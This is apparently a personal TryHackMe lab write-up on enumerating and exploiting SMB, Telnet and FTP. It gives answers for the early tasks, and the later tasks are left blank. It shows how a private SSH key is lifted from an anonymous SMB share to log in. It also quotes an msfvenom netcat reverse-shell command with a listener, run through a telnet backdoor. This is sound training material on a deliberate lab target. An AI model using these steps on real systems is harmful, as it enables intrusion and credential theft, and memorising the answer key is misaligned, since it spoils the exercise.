## Task 1 - Get Connected
Ready? Let's get going!
> No answer needed

## Task 2 - Understanding SMB
What does SMB stand for?    
> Server Message Block

What type of protocol is SMB?    
> response-request

What do clients connect to servers using?    
> TCP/IP

What systems does Samba run on?
> Unix


## Task 3 - Enumerating SMB

Conduct an nmap scan of your choosing, How many ports are open?
> 3

What ports is SMB running on?
> 139/445

Let's get started with Enum4Linux, conduct a full basic enumeration. For starters, what is the workgroup name?    
> ![Screen Shot 2021-12-24 at 11 29 28 pm](https://user-images.githubusercontent.com/65474495/147352685-d9617f6b-244b-4825-9a5f-26b097293c73.png)

>  Workgroup

What comes up as the name of the machine?        
> ![Screen Shot 2021-12-24 at 11 35 06 pm](https://user-images.githubusercontent.com/65474495/147353010-eb797125-e30a-4d32-bbac-4dba919ad8a3.png)

> polosmb

What operating system version is running?    
> ![Screen Shot 2021-12-24 at 11 35 48 pm](https://user-images.githubusercontent.com/65474495/147353053-b8b176b1-4be4-42cc-94bd-fabb99a01f7f.png)

> 6.1

What share sticks out as something we might want to investigate?    
> ![Screen Shot 2021-12-25 at 10 09 24 am](https://user-images.githubusercontent.com/65474495/147373960-416864f4-b8ef-4ec6-9597-45a271bf6163.png)

> We want to investigate the 'profiles' share, because we may be able to extract user info from it, the flag is: profiles

## Task 4 -  Exploiting SMB
What would be the correct syntax to access an SMB share called "secret" as user "suit" on a machine with the IP 10.10.10.2 on the default port?
> smbclient //10.10.10.2/secret -U suit -p 445

Great! Now you've got a hang of the syntax, let's have a go at trying to exploit this vulnerability. You have a list of users, the name of the share (smb) and a suspected vulnerability.
> No answer needed

Does the share allow anonymous access? Y/N?
> ![Screen Shot 2021-12-25 at 10 27 39 am](https://user-images.githubusercontent.com/65474495/147374179-6e1789a1-9154-439f-b65b-a65a4da99739.png)


> Y

Great! Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to?
> Looking around this profile folder, the "Working From Home Information.txt" seems interesting.
> ![Screen Shot 2021-12-25 at 10 37 00 am](https://user-images.githubusercontent.com/65474495/147374282-75e24e64-ae71-458f-8c62-880c5bfb6d5a.png)

> So I downloaded it to my local machine with get
> ![Screen Shot 2021-12-25 at 10 40 10 am](https://user-images.githubusercontent.com/65474495/147374317-f86e36bd-d180-4328-a024-a6bd7799a2da.png)

> Then I cat it in my local terminal, which then shows this letter:
> ![Screen Shot 2021-12-25 at 10 41 19 am](https://user-images.githubusercontent.com/65474495/147374333-bf9d2bbf-4396-459b-a8ae-4c8cbe7955cf.png)


> This letter indicates that this profile folder belongs to John Cactus. 

What service has been configured to allow him to work from home?
> ssh

Okay! Now we know this, what directory on the share should we look in?
> .ssh

This directory contains authentication keys that allow a user to authenticate themselves on, and then access, a server. Which of these keys is most useful to us?
> A bit of googling tells us the default name of an ssh identity file is id_rsa, which is also the answer to this challenge

> ![Screen Shot 2021-12-25 at 10 50 08 am](https://user-images.githubusercontent.com/65474495/147374407-16f0a64c-a922-40f8-860a-9bf6795e6e37.png)

Download this file to your local machine, and change the permissions to "600" using "chmod 600 [file]".
Now, use the information you have already gathered to work out the username of the account. Then, use the service and key to log-in to the server.
What is the smb.txt flag?
> Now we use get to download the "id_rsa" file and also the "id_rsa.pub" file to be safe.
> ![Screen Shot 2021-12-25 at 10 54 09 am](https://user-images.githubusercontent.com/65474495/147374437-efb0c803-bd3c-4627-aa67-5cfda31e23fa.png)

> Now on our local terminal, use cat to see what are in these file.
> ![Screen Shot 2021-12-25 at 10 56 48 am](https://user-images.githubusercontent.com/65474495/147374454-4bb43b16-21a7-4891-8fee-dc7e755d74ab.png)

> The id_rsa file provides us the key while the id_rsa.pub give use an username at the end of the file.

> After a quick googling, we can use the -i flag of the ssh as it use the identity_file, which is the id_rsa file in this case. The command to access the ssh server will look something like this: ssh cactus@10.10.166.77 -i id_rsa , where '10.10.166.77' is the ip of the machine that tryhackme give to you. Also remember to "chmod 600 id_rsa"

> Now we have successfully logged in.
> ![Screen Shot 2021-12-25 at 11 09 47 am](https://user-images.githubusercontent.com/65474495/147374625-4220e391-2220-425b-bf44-2cd88a353855.png)

> Time to look for the flag :)
> ![Screen Shot 2021-12-25 at 11 11 55 am](https://user-images.githubusercontent.com/65474495/147374667-47c1ed4d-fdd3-4e13-9e17-0c029e1532cb.png)


## Task 5 - Understanding Telnet
What is Telnet?    
> application protocol

What has slowly replaced Telnet?    
> ssh

How would you connect to a Telnet server with the IP 10.10.10.3 on port 23?
> telnet 10.10.10.3 -p 23

The lack of what, means that all Telnet communication is in plaintext?
> encryption

## Task 6 - Enumerating Telnet

How many ports are open on the target machine?    
> 

What port is this?
> 

This port is unassigned, but still lists the protocol it's using, what protocol is this?     
> 

Now re-run the nmap scan, without the -p- tag, how many ports show up as open?
> 

Here, we see that by assigning telnet to a non-standard port, it is not part of the common ports list, or top 1000 ports, that nmap scans. It's important to try every angle when enumerating, as the information you gather here will inform your exploitation stage.
> No answer needed

Based on the title returned to us, what do we think this port could be used for?
> 

Who could it belong to? Gathering possible usernames is an important step in enumeration.
> 

Always keep a note of information you find during your enumeration stage, so you can refer back to it when you move on to try exploits.
> No answer needed


## Task 7 - Exploiting Telnet
Okay, let's try and connect to this telnet port! If you get stuck, have a look at the syntax for connecting outlined above.
> No answer needed

Great! It's an open telnet connection! What welcome message do we receive?
> 

Let's try executing some commands, do we get a return on any input we enter into the telnet session? (Y/N)
> 

Hmm... that's strange. Let's check to see if what we're typing is being executed as a system command.
> No answer needed

Start a tcpdump listener on your local machine.
If using your own machine with the OpenVPN connection, use:
sudo tcpdump ip proto \\icmp -i tun0
If using the AttackBox, use:
sudo tcpdump ip proto \\icmp -i eth0
This starts a tcpdump listener, specifically listening for ICMP traffic, which pings operate on.
> No answer needed

Now, use the command "ping [local THM ip] -c 1" through the telnet session to see if we're able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N)
> 

Great! This means that we are able to execute system commands AND that we are able to reach our local machine. Now let's have some fun!
> No answer needed

We're going to generate a reverse shell payload using msfvenom.This will generate and encode a netcat reverse shell for us. Here's our syntax:
"msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R"
-p = payload
lhost = our local host IP address (this is your machine's IP address)
lport = the port to listen on (this is the port on your machine)
R = export the payload in raw format

What word does the generated payload start with?
> 

Perfect. We're nearly there. Now all we need to do is start a netcat listener on our local machine. We do this using:
"nc -lvp [listening port]"
What would the command look like for the listening port we selected in our payload?
> 

Great! Now that's running, we need to copy and paste our msfvenom payload into the telnet session and run it as a command. Hopefully- this will give us a shell on the target machine!
> No answer needed

Success! What is the contents of flag.txt?
> 


## Task 8 - Understanding FTP

What communications model does FTP use?
> 

What's the standard FTP port?
> 

How many modes of FTP connection are there?    
> 


## Task 9 - Enumerating FTP
Run an nmap scan of your choice.
How many ports are open on the target machine? 
> 

What port is ftp running on?
> 

What variant of FTP is running on it?  
> 

Great, now we know what type of FTP server we're dealing with we can check to see if we are able to login anonymously to the FTP server. We can do this using by typing "ftp [IP]" into the console, and entering "anonymous", and no password when prompted.
What is the name of the file in the anonymous FTP directory?
> 

What do we think a possible username could be?
> 

Great! Now we've got details about the FTP server and, crucially, a possible username. Let's see what we can do with that...
> No answer needed


## Task 10 - Exploiting FTP
What is the password for the user "mike"?
> 

Bingo! Now, let's connect to the FTP server as this user using "ftp [IP]" and entering the credentials when prompted
> No answer needed

What is ftp.txt?
> 


## Task 11 - Expanding Your Knowledge
Well done, you did it!
> No answer needed

